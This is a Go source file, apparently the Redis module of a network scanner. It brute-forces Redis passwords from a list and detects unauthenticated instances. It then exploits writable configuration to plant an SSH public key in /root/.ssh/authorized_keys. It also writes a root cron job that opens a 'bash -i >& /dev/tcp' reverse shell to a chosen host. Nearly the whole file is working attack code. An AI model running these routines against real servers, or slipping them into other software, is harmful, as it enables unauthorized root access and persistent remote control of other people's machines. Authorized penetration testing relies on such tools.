package Plugins

import (
	"bufio"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	"net"
	"os"
	"strings"
	"time"
)

func RedisScan(info *common.HostInfo) (tmperr error) {
	flag, err := RedisUnauth(info)
	if flag == true && err == nil {
		return err
	}
	for _, pass := range common.Passwords {
		pass = strings.Replace(pass, "{user}", "redis", -1)
		flag, err := RedisConn(info, pass)
		if flag == true && err == nil {
			return err
		} else {
			tmperr = err
		}
	}
	return tmperr
}

func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%d", info.Host, common.PORTList["redis"])
	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "+OK") {
		result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
		common.LogSuccess(result)
		flag = true
		Expoilt(info, realhost, conn)
	}
	return flag, err
}

func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%d", info.Host, common.PORTList["redis"])
	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "redis_version") {
		result := fmt.Sprintf("[+] Redis:%s unauthorized", realhost)
		common.LogSuccess(result)
		flag = true
		Expoilt(info, realhost, conn)
	}
	return flag, err
}

func Expoilt(info *common.HostInfo, realhost string, conn net.Conn) error {
	flagSsh, flagCron, err := testwrite(conn)
	if err != nil {
		return err
	}
	if flagSsh == true {
		result := fmt.Sprintf("Redis:%v like can write /root/.ssh/", realhost)
		common.LogSuccess(result)
		if info.RedisFile != "" {
			writeok, text, err := writekey(conn, info.RedisFile)
			if err != nil {
				return err
			}
			if writeok {
				result := fmt.Sprintf("%v SSH public key was written successfully", realhost)
				common.LogSuccess(result)
			} else {
				fmt.Println("Redis:", realhost, "SSHPUB write failed", text)
			}
		}
	}

	if flagCron == true {
		result := fmt.Sprintf("Redis:%v like can write /var/spool/cron/", realhost)
		common.LogSuccess(result)
		if info.RedisShell != "" {
			writeok, text, err := writecron(conn, info.RedisShell)
			if err != nil {
				return err
			}
			if writeok {
				result := fmt.Sprintf("%v /var/spool/cron/root was written successfully", realhost)
				common.LogSuccess(result)
			} else {
				fmt.Println("Redis:", realhost, "cron write failed", text)
			}
		}
	}
	return err
}

func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	flag = false
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err := conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename authorized_keys\r\n")))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			key, err := Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("Open %s error, %v", filename, err)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("the keyfile %s is empty", filename)
				return flag, text, err
			}
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
	flag = false
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename root\r\n")))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			scanIp, scanPort := strings.Split(host, ":")[0], strings.Split(host, ":")[1]
			_, err = conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func Readfile(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}

func readreply(conn net.Conn) (result string, err error) {
	buf := make([]byte, 4096)
	for {
		count, err := conn.Read(buf)
		if err != nil {
			break
		}
		result += string(buf[0:count])
		if count < 4096 {
			break
		}
	}
	return result, err
}

func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
	var text string
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flag = true
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flagCron = true
	}
	return flag, flagCron, err
}
